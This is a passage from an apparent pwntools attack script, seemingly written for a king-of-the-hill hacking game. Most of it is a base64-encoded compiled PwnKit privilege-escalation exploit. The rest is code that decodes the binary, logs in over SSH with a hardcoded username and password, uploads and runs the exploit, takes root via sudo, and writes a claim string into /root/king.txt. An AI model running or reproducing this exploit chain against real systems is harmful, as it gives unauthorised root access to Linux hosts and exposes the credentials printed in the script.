AAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkBIAAAAAAABAEgAAAAAA\nAAEAAAAAAAAAMAEAAAAAAAAMAAAAAAAAAAAQAAAAAAAADQAAAAAAAACkFwAAAAAAABkAAAAAAAAA\nCD4AAAAAAAAbAAAAAAAAAAgAAAAAAAAAGgAAAAAAAAAQPgAAAAAAABwAAAAAAAAACAAAAAAAAAD1\n/v9vAAAAAHADAAAAAAAABQAAAAAAAAAQBwAAAAAAAAYAAAAAAAAAsAMAAAAAAAAKAAAAAAAAAGgB\nAAAAAAAACwAAAAAAAAAYAAAAAAAAAAMAAAAAAAAAAEAAAAAAAAACAAAAAAAAAHACAAAAAAAAFAAA\nAAAAAAAHAAAAAAAAABcAAAAAAAAA0AkAAAAAAAAHAAAAAAAAABAJAAAAAAAACAAAAAAAAADAAAAA\nAAAAAAkAAAAAAAAAGAAAAAAAAAD+//9vAAAAAMAIAAAAAAAA////bwAAAAABAAAAAAAAAPD//28A\nAAAAeAgAAAAAAAD5//9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGD4AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nNhAAAAAAAABGEAAAAAAAAFYQAAAAAAAAZhAAAAAAAAB2EAAAAAAAAIYQAAAAAAAAlhAAAAAAAACm\nEAAAAAAAALYQAAAAAAAAxhAAAAAAAADWEAAAAAAAAOYQAAAAAAAA9hAAAAAAAAAGEQAAAAAAABYR\nAAAAAAAAJhEAAAAAAAA2EQAAAAAAAEYRAAAAAAAAVhEAAAAAAABmEQAAAAAAAHYRAAAAAAAAhhEA\nAAAAAACWEQAAAAAAAKYRAAAAAAAAthEAAAAAAADGEQAAAAAAAOhAAAAAAAAAR0NDOiAoR05VKSAx\nMi4xLjAAAAAAAAAAAAAAAAAAAAA8AAAAAgAAAAAACAAAAAAAABAAAAAAAAAWAAAAAAAAAKQXAAAA\nAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPAAAAAIAIwAAAAgAAAAAABYQAAAAAAAABQAAAAAA\nAACsFwAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB8AAAAFAAEIAAAAAAEAAAAADAAAAAAA\nAAAZAAAANAAAAAGAHwAAAAUAAQgSAAAAAWcAAAAtAAAAQAAAABkAAAA0AAAAAYABEQAQF1UXAw4b\nDiUOEwUAAAABEQAQF1UXAw4bDiUOEwUAAABjAAAABQAIAC4AAAABAQH7Dg0AAQEBAQAAAAEAAAEB\nAR8CAAAAABsAAAACAR8CDwItAAAAAS0AAAABAAkCABAAAAAAAAADPwFMTHU9LwICAAEBAAkCpBcA\nAAAAAAAD0gABSwIEAAEBXgAAAAUACAAuAAAAAQEB+w4NAAEBAQEAAAABAAABAQEfAgAAAAAbAAAA\nAgEfAg8CNAAAAAE0AAAAAQAJAhYQAAAAAAAAAycBSwIBAAEBAAkCrBcAAAAAAAADKwFLAgEAAQEu\nLi9zeXNkZXBzL3g4Nl82NC9jcnRpLlMAL2J1aWxkL2dsaWJjL3NyYy9nbGliYy9jc3UAR05VIEFT\nIDIuMzgALi4vc3lzZGVwcy94ODZfNjQvY3J0bi5TAC9idWlsZC9nbGliYy9zcmMvZ2xpYmMvY3N1\nAC4uL3N5c2RlcHMveDg2XzY0AGNydGkuUwBjcnRuLlMAHQAAAAUACAAAAAAABwAQAAAAAAAAFgek\nFwAAAAAAAAgAHQAAAAUACAAAAAAABxYQAAAAAAAABQesFwAAAAAAAAUAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAAwAAAACAAwA0BEAAAAAAAAA\nAAAAAAAAAA4AAAACAAwAABIAAAAAAAAAAAAAAAAAACEAAAACAAwAQBIAAAAAAAAAAAAAAAAAADcA\nAAABABgA8EAAAAAAAAABAAAAAAAAAEMAAAABABMAED4AAAAAAAAAAAAAAAAAAGoAAAACAAwAkBIA\nAAAAAAAAAAAAAAAAAHYAAAABABIACD4AAAAAAAAAAAAAAAAAAJUAAAAEAPH/AAAAAAAAAAAAAAAA\nAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAJ4AAAABABEA0CIAAAAAAAAAAAAAAAAAAAAAAAAE\nAPH/AAAAAAAAAAAAAAAAAAAAAKwAAAACAA0ApBcAAAAAAAAAAAAAAAAAALIAAAABABcA6EAAAAAA\nAAAAAAAAAAAAAL8AAAABABQAGD4AAAAAAAAAAAAAAAAAAMgAAAAAABAAvCEAAAAAAAAAAAAAAAAA\nANsAAAABABcA8EAAAAAAAAAAAAAAAAAAAOcAAAABABYAAEAAAAAAAAAAAAAAAAAAAD4DAAACAAoA\nABAAAAAAAAAAAAAAAAAAAP0AAAASAAAAAAAAAAAAAAAAAAAAAAAAABABAAASAAAAAAAAAAAAAAAA\nAAAAAAAAACEBAAASAAAAAAAAAAAAAAAAAAAAAAAAAD4BAAASAAAAAAAAAAAAAAAAAAAAAAAAAFEB\nAAAgAAAAAAAAAAAAAAAAAAAAAAAAAG0BAAASAAAAAAAAAAAAAAAAAAAAAAAAAH8BAAASAAAAAAAA\nAAAAAAAAAAAAAAAAADICAAASAAAAAAAAAAAAAAAAAAAAAAAAAJEBAAASAAwA1hIAAAAAAAArAAAA\nAAAAAJYBAAASAAAAAAAAAAAAAAAAAAAAAAAAAKsBAAASAAAAAAAAAAAAAAAAAAAAAAAAAMEBAAAS\nAAAAAAAAAAAAAAAAAAAAAAAAANQBAAARAA8AoCEAAAAAAAAcAAAAAAAAAOMBAAASAAAAAAAAAAAA\nAAAAAAAAAAAAAPkBAAASAAAAAAAAAAAAAAAAAAAAAAAAAAoCAAASAAAAAAAAAAAAAAAAAAAAAAAA\nAB0CAAASAAAAAAAAAAAAAAAAAAAAAAAAADECAAASAAAAAAAAAAAAAAAAAAAAAAAAAMIBAAASAAAA\nAAAAAAAAAAAAAAAAAAAAAEMCAAASAAAAAAAAAAAAAAAAAAAAAAAAAFQCAAASAAAAAAAAAAAAAAAA\nAAAAAAAAAGUCAAASAAAAAAAAAAAAAAAAAAAAAAAAAGQAAAASAAwAARMAAAAAAABhAwAAAAAAAHgC\nAAAgAAAAAAAAAAAAAAAAAAAAAAAAAIcCAAASAAAAAAAAAAAAAAAAAAAAAAAAAJkCAAASAAwAYhYA\nAAAAAAAHAAAAAAAAAJ8CAAASAAwAmRIAAAAAAAA9AAAAAAAAAKkCAAASAAAAAAAAAAAAAAAAAAAA\nAAAAALsCAAASAAAAAAAAAAAAAAAAAAAAAAAAAM4CAAASAAAAAAAAAAAAAAAAAAAAAAAAAOACAAAg\nAAAAAAAAAAAAAAAAAAAAAAAAAPoCAAAiAAAAAAAAAAAAAAAAAAAAAAAAABUDAAASAAAAAAAAAAAA\nAAAAAAAAAAAAACYDAAASAAAAAAAAAAAAAAAAAAAAAAAAADkDAAASAAwAaRYAAAAAAAA5AQAAAAAA\nAABjcnRzdHVmZi5jAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABj\nb21wbGV0ZWQuMABfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9k\ndW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAUHduS2l0LmMAX19GUkFNRV9FTkRf\nXwBfZmluaQBfX2Rzb19oYW5kbGUAX0RZTkFNSUMAX19HTlVfRUhfRlJBTUVfSERSAF9fVE1DX0VO\nRF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBnZXRlbnZAR0xJQkNfMi4yLjUAbmZ0d0BHTElCQ18y\nLjMuMwBfX2Vycm5vX2xvY2F0aW9uQEdMSUJDXzIuMi41AHJlbW92ZUBHTElCQ18yLjIuNQBfSVRN\nX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2V4aXRAR0xJQkNfMi4yLjUAbWtkaXJAR0xJQkNfMi4y\nLjUAcm1yZgByZWFkbGlua0BHTElCQ18yLjIuNQBzZXRyZXN1aWRAR0xJQkNfMi4yLjUAZmNsb3Nl\nQEdMSUJDXzIuMi41AHNlcnZpY2VfaW50ZXJwAHNldHJlc2dpZEBHTElCQ18yLjIuNQBkdXAyQEdM\nSUJDXzIuMi41AGV4ZWN2cGVAR0xJQkNfMi4xMQBzeW1saW5rQEdMSUJDXzIuMi41AGZwdXRzQEdM\nSUJDXzIuMi41AHBpcGVAR0xJQkNfMi4yLjUAcmVhZEBHTElCQ18yLjIuNQBleGVjdmVAR0xJQkNf\nMi4yLjUAX19nbW9uX3N0YXJ0X18AbWVtY3B5QEdMSUJDXzIuMTQAZ2NvbnYAdW5saW5rX2NiAGZv\ncGVuQEdMSUJDXzIuMi41AHBlcnJvckBHTElCQ18yLjIuNQBjcmVhdEBHTElCQ18yLjIuNQBfSVRN\nX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMi41AGZvcmtAR0xJ\nQkNfMi4yLjUAc3Ryc3RyQEdMSUJDXzIuMi41AGdjb252X2luaXQAAC5zeW10YWIALnN0cnRhYgAu\nc2hzdHJ0YWIALm5vdGUuZ251LnByb3BlcnR5AC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gA\nLmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJl\nbGEucGx0AC5pbml0AC50ZXh0AC5maW5pAC5yb2RhdGEALmludGVycAAuZWhfZnJhbWVfaGRyAC5l\naF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuZHluYW1pYwAuZ290AC5nb3QucGx0AC5k\nYXRhAC5ic3MALmNvbW1lbnQALmRlYnVnX2FyYW5nZXMALmRlYnVnX2luZm8ALmRlYnVnX2FiYnJl\ndgAuZGVidWdfbGluZQAuZGVidWdfc3RyAC5kZWJ1Z19saW5lX3N0cgAuZGVidWdfcm5nbGlzdHMA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAbAAAABwAAAAIAAAAAAAAAGAMAAAAAAAAYAwAAAAAAADAAAAAAAAAAAAAAAAAA\nAAAIAAAAAAAAAAAAAAAAAAAALgAAAAcAAAACAAAAAAAAAEgDAAAAAAAASAMAAAAAAAAkAAAAAAAA\nAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEEAAAD2//9vAgAAAAAAAABwAwAAAAAAAHADAAAAAAAA\nPAAAAAAAAAAEAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABLAAAACwAAAAIAAAAAAAAAsAMAAAAAAACw\nAwAAAAAAAGADAAAAAAAABQAAAAEAAAAIAAAAAAAAABgAAAAAAAAAUwAAAAMAAAACAAAAAAAAABAH\nAAAAAAAAEAcAAAAAAABoAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAFsAAAD///9vAgAA\nAAAAAAB4CAAAAAAAAHgIAAAAAAAASAAAAAAAAAAEAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABoAAAA\n/v//bwIAAAAAAAAAwAgAAAAAAADACAAAAAAAAFAAAAAAAAAABQAAAAEAAAAIAAAAAAAAAAAAAAAA\nAAAAdwAAAAQAAAACAAAAAAAAABAJAAAAAAAAEAkAAAAAAADAAAAAAAAAAAQAAAAAAAAACAAAAAAA\nAAAYAAAAAAAAAIEAAAAEAAAAQgAAAAAAAADQCQAAAAAAANAJAAAAAAAAcAIAAAAAAAAEAAAAFgAA\nAAgAAAAAAAAAGAAAAAAAAACLAAAAAQAAAAYAAAAAAAAAABAAAAAAAAAAEAAAAAAAABsAAAAAAAAA\nAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAhgAAAAEAAAAGAAAAAAAAACAQAAAAAAAAIBAAAAAAAACw\nAQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAJEAAAABAAAABgAAAAAAAADQEQAAAAAAANAR\nAAAAAAAA0gUAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAACXAAAAAQAAAAYAAAAAAAAApBcA\nAAAAAACkFwAAAAAAAA0AAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAnQAAAAEAAAACAAAA\nAAAAAAAgAAAAAAAAACAAAAAAAACVAQAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKUAAAAB\nAAAAAgAAAAAAAACgIQAAAAAAAKAhAAAAAAAAHAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAA\nAACtAAAAAQAAAAIAAAAAAAAAvCEAAAAAAAC8IQAAAAAAADwAAAAAAAAAAAAAAAAAAAAEAAAAAAAA\nAAAAAAAAAAAAuwAAAAEAAAACAAAAAAAAAPghAAAAAAAA+CEAAAAAAADcAAAAAAAAAAAAAAAAAAAA\nCAAAAAAAAAAAAAAAAAAAAMUAAAAOAAAAAwAAAAAAAAAIPgAAAAAAAAguAAAAAAAACAAAAAAAAAAA\nAAAAAAAAAAgAAAAAAAAACAAAAAAAAADRAAAADwAAAAMAAAAAAAAAED4AAAAAAAAQLgAAAAAAAAgA\nAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA3QAAAAYAAAADAAAAAAAAABg+AAAAAAAAGC4A\nAAAAAADAAQAAAAAAAAUAAAAAAAAACAAAAAAAAAAQAAAAAAAAAOYAAAABAAAAAwAAAAAAAADYPwAA\nAAAAANgvAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADrAAAAAQAAAAMAAAAA\nAAAAAEAAAAAAAAAAMAAAAAAAAOgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA9AAAAAEA\nAAADAAAAAAAAAOhAAAAAAAAA6DAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAA\nAPoAAAAIAAAAAwAAAAAAAADwQAAAAAAAAPAwAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAA\nAAAAAAAAAAD/AAAAAQAAADAAAAAAAAAAAAAAAAAAAADwMAAAAAAAABIAAAAAAAAAAAAAAAAAAAAB\nAAAAAAAAAAEAAAAAAAAACAEAAAEAAAAAAAAAAAAAAAAAAAAAAAAAEDEAAAAAAACAAAAAAAAAAAAA\nAAAAAAAAEAAAAAAAAAAAAAAAAAAAABcBAAABAAAAAAAAAAAAAAAAAAAAAAAAAJAxAAAAAAAARgAA\nAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAjAQAAAQAAAAAAAAAAAAAAAAAAAAAAAADWMQAA\nAAAAACQAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAMQEAAAEAAAAAAAAAAAAAAAAAAAAA\nAAAA+jEAAAAAAADJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAD0BAAABAAAAMAAAAAAA\nAAAAAAAAAAAAAMMyAAAAAAAAWQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAABIAQAAAQAA\nADAAAAAAAAAAAAAAAAAAAAAcMwAAAAAAADsAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAA\nWAEAAAEAAAAAAAAAAAAAAAAAAAAAAAAAVzMAAAAAAABCAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAA\nAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAAKAzAAAAAAAAKAUAAAAAAAAiAAAAFAAAAAgA\nAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAADIOAAAAAAAAEQDAAAAAAAAAAAA\nAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAADDwAAAAAAABoAQAA\nAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==\n')
os.system('echo "%s" | base64 -d > exploit' % (payload))
request = ssh(host=target, user='narrator', password='X8JEETQmf3hkS65f')
shell = request.process("/bin/sh")
request.upload("exploit")
shell.sendline(b"chmod +x exploit; bash -c './exploit'")
time.sleep(0.5)
shell.sendline(b"sudo bash")
time.sleep(0.5)
shell.sendline(b"cd /root; echo '0xASTUTE' > king.txt")
time.sleep(0.5)
shell.sendline(b"cd")
time.sleep(0.5)
shell.interactive()